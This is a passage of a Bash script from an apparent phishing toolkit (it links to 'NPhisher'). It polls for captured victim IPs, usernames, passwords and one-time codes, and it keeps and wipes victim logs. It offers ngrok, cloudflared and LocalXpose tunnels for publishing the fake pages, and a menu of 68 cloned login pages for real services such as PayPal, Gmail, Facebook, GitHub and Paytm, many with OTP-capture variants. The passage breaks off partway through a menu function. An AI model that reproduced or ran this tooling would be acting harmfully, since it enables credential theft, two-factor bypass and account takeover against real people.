        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!!"
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
                        echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                fi
		if [[ -e ".server/www/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
			capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
		fi
                sleep 0.75
	done
}

#online or offline stats
netstats="Offline"
check_netstats() {
			wget -q --spider http://api.github.com
			if [ $? -eq 0 ]; then
				netstats="Online"
			else
				netstats="Offline"
			fi
}
#Logs check
logs_check() {
	if [ -z "$(ls -A $DIR)" ]; then
		logs_menu
	else
		echo "No logs found"
		{ sleep 1; clear; mainmenu; }
	fi
}
logs_menu() {
clear
banner
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${ORANGE} View Logs    "
echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Open Logs   "
echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Reset Logs  "
echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Back to Tunnel menu   "
read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu

        case $reply_logs_menu in
                1 | 01)
                        ls logs/
			{ sleep 5; clear; logs_menu; };;
                2 | 02)
			ls logs/
                        read -p "${RED}[${WHITE}?${RED}]${GREEN} Enter the file name without extension (.txt) : ${BLUE}"
			if [ -f "logs/$REPLY.txt" ]; then
				cat logs/$REPLY.txt
			else
				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
	                        { sleep 1; clear; logs_menu; }
			fi;;
                3 | 03)
			read -p "${RED}[${WHITE}?${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
			case $REPLY in
        	                Y | y)
                	                rm -rf logs
					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
					{ sleep 1; clear; tunnelmenu; };;
                        	N | n)
                                	{ clear;  logs_menu; };;

	                esac;;
                4 | 04)
                        { sleep 1; clear; tunnelmenu; };;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; logs_menu; };;
        esac
}
## Tunnel selection
tunnelmenu() {
clear
banner
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

        case $REPLY in
                1 | 01)
                        start_localhost;;
                2 | 02)
                        check_ngrok;;
                3 | 03)
                        check_cloudflared;;
		4 | 04)
                        check_localxpose;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; tunnelmenu; };;
        esac
}

mainmenu() {
echo -e " "
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " "
check_netstats
echo "${GREEN}Network Status = ${RED}$netstats"
echo -e " "
echo -e "${RED} CHOOSE A SITE : ${NC}"
echo -e " "
echo -e " "
echo -e "${BLUE} [1] ${GREEN} Adobe 	    	 ${NC}""${BLUE} [26] ${GREEN} Mediafire         ${NC}""${BLUE} [51] ${GREEN} Telenor           ${NC}"
echo -e "${BLUE} [2] ${GREEN} Airtel Sim 	 ${NC}""${BLUE} [27] ${GREEN} Messenger         ${NC}""${BLUE} [52] ${GREEN} Tiktok            ${NC}"
echo -e "${BLUE} [3] ${GREEN} AirtelXstream	 ${NC}""${BLUE} [28] ${GREEN} Microsoft         ${NC}""${BLUE} [53] ${GREEN} Twitch            ${NC}"
echo -e "${BLUE} [4] ${GREEN} Ajio 		 ${NC}""${BLUE} [29] ${GREEN} Mobikwik          ${NC}""${BLUE} [54] ${GREEN} Twitter           ${NC}"
echo -e "${BLUE} [5] ${GREEN} Amazon 		 ${NC}""${BLUE} [30] ${GREEN} Myspace           ${NC}""${BLUE} [55] ${GREEN} Ubereats          ${NC}"
echo -e "${BLUE} [6] ${GREEN} Apple 		 ${NC}""${BLUE} [31] ${GREEN} Netflix           ${NC}""${BLUE} [56] ${GREEN} verizon           ${NC}"
echo -e "${BLUE} [7] ${GREEN} Badoo 	         ${NC}""${BLUE} [32] ${GREEN} Ola               ${NC}""${BLUE} [57] ${GREEN} VI                ${NC}"
echo -e "${BLUE} [8] ${GREEN} Clash of Clans	 ${NC}""${BLUE} [33] ${GREEN} Origin            ${NC}""${BLUE} [58] ${GREEN} VK                ${NC}"
echo -e "${BLUE} [9] ${GREEN} Date 		 ${NC}""${BLUE} [34] ${GREEN} Paypal            ${NC}""${BLUE} [59] ${GREEN} Whatsapp          ${NC}"
echo -e "${BLUE} [10] ${GREEN} Devianart 	 ${NC}""${BLUE} [35] ${GREEN} Paytm             ${NC}""${BLUE} [60] ${GREEN} Wordpress         ${NC}"
echo -e "${BLUE} [11] ${GREEN} DropBox 		 ${NC}""${BLUE} [36] ${GREEN} Phonepay          ${NC}""${BLUE} [61] ${GREEN} Xbox              ${NC}"
echo -e "${BLUE} [12] ${GREEN} Ebay 		 ${NC}""${BLUE} [37] ${GREEN} Pinterest         ${NC}""${BLUE} [62] ${GREEN} Yahoo             ${NC}"
echo -e "${BLUE} [13] ${GREEN} Facebook 	 ${NC}""${BLUE} [38] ${GREEN} Playstation       ${NC}""${BLUE} [63] ${GREEN} Yandex            ${NC}"
echo -e "${BLUE} [14] ${GREEN} Flipcart 	 ${NC}""${BLUE} [39] ${GREEN} ProtonMail        ${NC}""${BLUE} [64] ${GREEN} Youtube Subs      ${NC}"
echo -e "${BLUE} [15] ${GREEN} Freefire 	 ${NC}""${BLUE} [40] ${GREEN} Pubg              ${NC}""${BLUE} [65] ${GREEN} Discord           ${NC}"
echo -e "${BLUE} [16] ${GREEN} Github 		 ${NC}""${BLUE} [41] ${GREEN} Quora             ${NC}""${BLUE} [66] ${GREEN} Jio router        ${NC}"
echo -e "${BLUE} [17] ${GREEN} Gitlab 		 ${NC}""${BLUE} [42] ${GREEN} Reddit            ${NC}""${BLUE} [67] ${GREEN} Google WIFI       ${NC}"
echo -e "${BLUE} [18] ${GREEN} Gmail		 ${NC}""${BLUE} [43] ${GREEN} Shopify           ${NC}""${BLUE} [68] ${ORANGE} Mobile Pattern    ${NC}"
echo -e "${BLUE} [19] ${GREEN} Google 		 ${NC}""${BLUE} [44] ${GREEN} Snapchat          ${NC}"
echo -e "${BLUE} [20] ${GREEN} Gpay 	   	 ${NC}""${BLUE} [45] ${GREEN} Socialclub        ${NC}"
echo -e "${BLUE} [21] ${GREEN} icloud 		 ${NC}""${BLUE} [46] ${GREEN} Spotify           ${NC}"
echo -e "${BLUE} [22] ${GREEN} Instagram 	 ${NC}""${BLUE} [47] ${GREEN} Stackoverflow     ${NC}"
echo -e "${BLUE} [23] ${GREEN} Jazz		 ${NC}""${BLUE} [48] ${GREEN} Steam             ${NC}"
echo -e "${BLUE} [24] ${GREEN} Jio 		 ${NC}""${BLUE} [49] ${GREEN} Subitout          ${NC}"
echo -e "${BLUE} [25] ${GREEN} Linkedin 	 ${NC}""${BLUE} [50] ${GREEN} Telegram          ${NC}"
echo -e " "
echo -e "${BLUE} [A] ${RED} About              ${NC}""${BLUE} [B] ${RED} Request A site      ${NC}""${BLUE} [C] ${RED} Report an Issue        ${NC}"
echo -e "${BLUE} [D] ${RED} View Logs          ${NC}""${BLUE} [E] ${RED} Check for Updates   ${NC}""${BLUE} [00] ${RED} Exit                  ${NC}"
echo -e " "
read -p "${RED}[${WHITE}?${RED}]${GREEN} Select an option : ${BLUE}" reply
echo " "
case $reply in
        1 | 01)
                site_adobe;;
        2 | 02)
                website="airtelsim"
		tunnelmenu;;
	3 | 03)
                site_airtelxstream;;
	4 | 04)
		site_ajio;;
	5 | 05)
                site_amazon;;
        6 | 06)
                site_apple;;
	7 | 07)
                site_badoo;;
        8 | 08)
                website="clashofclans"
		tunnelmenu;;
	9 | 09)
                site_date;;
        10)
                site_devianart;;
	11)
                website="dropbox"
                tunnelmenu;;
	12)
                site_ebay;;
        13)
                site_facebook;;
	14)
                site_flipcart;;
	15)
                website="freefire"
                tunnelmenu;;
        16)
                site_github;;
	17)
                site_gitlab;;
	18)
                site_gmail;;
        19)
                site_google;;
	20)
		site_gpay;;
	21)
                website="icloud"
                tunnelmenu;;
	22)
                site_instagram;;
	23)
                website="jazz"
                tunnelmenu;;
        24)
                site_jio;;
        25)
                site_linkedin;;
        26)
                site_mediafire;;
	27)
                site_messenger;;
	28)
                site_microsoft;;
	29)
                website="mobikwik"
                tunnelmenu;;
	30)
                site_myspace;;
	31)
                site_netflix;;
	32)
                website="ola"
                tunnelmenu;;
	33)
                website="origin"
                tunnelmenu;;
	34)
                site_paypal;;
	35)
                site_paytm;;
	36)
                website="phonepay"
                tunnelmenu;;
	37)
                website="pinterest"
                tunnelmenu;;
	38)
		site_playstation;;
	39)
                site_protonmail;;
	40)
                website="pubg"
                tunnelmenu;;
	41)
                website="quora"
                tunnelmenu;;
	42)
                site_reddit;;
	43)
                site_shopify;;
	44)
                site_snapchat;;
	45)
                site_socialclub;;
	46)
                site_spotify;;
	47)
                site_stackoverflow;;
	48)
                site_steam;;
	49)
                website="subitoit"
                tunnelmenu;;
	50)
                website="telegram"
                tunnelmenu;;
	51)
                website="telenor"
                tunnelmenu;;
	52)
                site_tiktok;;
        53)
                site_twitch;;
	54)
                site_twitter;;
        55)
                site_ubereats;;
	56)
                site_verizon;;
        57)
                website="visim"
                tunnelmenu;;
	58)
                site_vk;;
        59)
                website="whatsapp"
                tunnelmenu;;
	60)
                site_wordpress;;
        61)
                site_xbox;;
	62)
                site_yahoo;;
        63)
                site_yandex;;
	64)
                site_ytsubs;;
	65)
		site_discord;;
	66)
		site_jiorouter;;
	67)
		website="google_wifi"
		tunnelmenu;;
	68)
		website="pattern"
		tunnelmenu;;
	A | a)
		xdg-open https://github.com/Alygnt/NPhisher
		{ sleep 2; clear;  banner; mainmenu; };;
	B | b | C | c)
		xdg-open https://github.com/RDXLR/Alygnt/issues/new
		{ sleep 2; clear; banner; mainmenu; };;
	D | d)
		logs_check;;
	E | e)
		check_net_update;;
	0 | 00)
		msg_exit;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; mainmenu; };;
esac


}



#WEBSITES
#adobe
site_adobe(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
	1 | 01)
		website="adobe"
		tunnelmenu;;
	2 | 02)
                website="adobe/otp"
                tunnelmenu;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_adobe; };;
esac
}
#airtelxstream
site_airtelxstream(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="airtelxstream"
                tunnelmenu;;
        2 | 02)
                website="airtelxstream/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_airtelxstream; };;
esac
}
#ajio
site_ajio(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ajio"
                tunnelmenu;;
        2 | 02)
                website="ajio/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ajio; };;
esac
}
#amazon
site_amazon(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="amazon"
                tunnelmenu;;
        2 | 02)
                website="amazon/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_amazon; };;
esac
}
#apple
site_apple(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="apple"
                tunnelmenu;;
        2 | 02)
                website="apple/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_apple; };;
esac
}
#badoo
site_badoo(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="badoo"
                tunnelmenu;;
        2 | 02)
                website="badoo/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_badoo; };;
esac
}
#date
site_date(){
echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="date1"
                tunnelmenu;;
        2 | 02)
                website="date1/otp"
                tunnelmenu;;
	3 | 03)
                website="date2"
                tunnelmenu;;
        4 | 04)
                website="date2/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_date; };;
esac
}
#devianart
site_devianart(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="devianart"
                tunnelmenu;;
        2 | 02)
                website="devianart/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_airtelxstream; };;
esac
}
#ebay
site_ebay(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ebay"
                tunnelmenu;;
        2 | 02)
                website="ebay/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ebay; };;
esac
}
#facebook
site_facebook(){
echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="facebook"
                tunnelmenu;;
        2 | 02)
                website="facebook/otp"
                tunnelmenu;;
	3 | 03)
                website="fb_poll"
                tunnelmenu;;
        4 | 04)
                website="fb_poll/otp"
                tunnelmenu;;
	5 | 05)
                website="fb_security"
                tunnelmenu;;
        6 | 06)
                website="fb_security/otp"
                tunnelmenu;;
	7 | 07)
                website="fb_standard"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_facebook; };;
esac
}
#flipcart
site_flipcart(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="flipcart"
                tunnelmenu;;
        2 | 02)
                website="flipcart/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_flipcart; };;
esac
}
#github
site_github(){
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="github"
                tunnelmenu;;
        2 | 02)
                website="github/otp"
                tunnelmenu;;
	3 | 03)
                website="github_advanced"
                tunnelmenu;;
        4 | 04)
                website="github_advanced/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_github; };;
esac
}
#gitlab
site_gitlab(){
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
	1 | 01)
                website="gitlab"
                tunnelmenu;;
        2 | 02)
                website="gitlab/otp"
                tunnelmenu;;
        3 | 03)
                website="gitlab_advanced"
                tunnelmenu;;
        4 | 04)
                website="gitlab_advanced/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gitlab; };;
esac
}
#gmail
site_gmail(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="gmail"
                tunnelmenu;;
        2 | 02)
                website="gmail/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gmail; };;
esac
}
#google
site_google(){
echo -e "${BLUE}[01]${CYAN} Google new - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Google new - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Google old- WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Google old- WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="google_new"
                tunnelmenu;;
        2 | 02)
                website="google_new/otp"
                tunnelmenu;;
        3 | 03)
                website="google_poll"
                tunnelmenu;;
        4 | 04)
                website="google_poll/otp"
                tunnelmenu;;
        5 | 05)
                website="google"
                tunnelmenu;;
	6 | 06)
		website="google/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_google; };;
esac
}
#gpay
site_gpay(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="gpay"
                tunnelmenu;;
        2 | 02)
                website="gpay/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gpay; };;
esac
}
#instagram
site_instagram(){
echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="instagram"
                tunnelmenu;;
        2 | 02)
                website="instagram/otp"
                tunnelmenu;;
        3 | 03)
                website="ig_advanced"
                tunnelmenu;;
        4 | 04)
                website="ig_advanced/otp"
                tunnelmenu;;
        5 | 05)
                website="ig_autoliker"
                tunnelmenu;;
        6 | 06)
                website="ig_autoliker/otp"
                tunnelmenu;;
        7 | 07)
                website="ig_followers"
                tunnelmenu;;
	8 | 08)
                website="ig_followers/otp"
                tunnelmenu;;
	9 | 09)
                website="ig_verify"
                tunnelmenu;;
	10)
                website="ig_old"
                tunnelmenu;;
        11)
                website="ig_old/otp"
                tunnelmenu;;
				12)
				        website="ig_video"
				        tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_instagram; };;
esac
}
#jio
site_jio(){
echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="jiosim"
                tunnelmenu;;
        2 | 02)
                website="jiooffer"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_jio; };;
esac
}
#linkedin
site_linkedin(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="linkedin"
                tunnelmenu;;
        2 | 02)
                website="linkedin/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_linkedin; };;
esac
}
#mediafire
site_mediafire(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="mediafire"
                tunnelmenu;;
        2 | 02)
                website="mediafire/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_mediafire; };;
esac
}
#messenger
site_messenger(){
echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="messenger"
                tunnelmenu;;
        2 | 02)
                website="messenger/otp"
                tunnelmenu;;
        3 | 03)
                website="messenger_old"
                tunnelmenu;;
        4 | 04)
                website="messenger_old/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_messenger; };;
esac
}
#microsoft
site_microsoft(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="microsoft"
                tunnelmenu;;
        2 | 02)
                website="microsoft/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_microsoft; };;
esac
}
#myspace
site_myspace(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="myspace"
                tunnelmenu;;
        2 | 02)
                website="myspace/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_myspace; };;
esac
}
#netflix
site_netflix(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="netflix"
                tunnelmenu;;
        2 | 02)
                website="netflix/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_netflix; };;
esac
}
#paypal
site_paypal(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="paypal"
                tunnelmenu;;
        2 | 02)
                website="paypal/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_paypal; };;
esac
}
#paytm
site_paytm(){
echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="paytm"
                tunnelmenu;;
        2 | 02)
                website="paytm/otp"
                tunnelmenu;;
        3 | 03)
                website="paytmoffer"
                tunnelmenu;;
        4 | 04)
                website="paytmoffer/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_paytm; };;
esac
}
#playstation
site_playstation(){
echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="playstation"
                tunnelmenu;;
        2 | 02)
                website="playstation/otp"
                tunnelmenu;;
        3 | 03)
                website="playstation2"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_playstation; };;
esac
}
#protonmail
site_protonmail(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
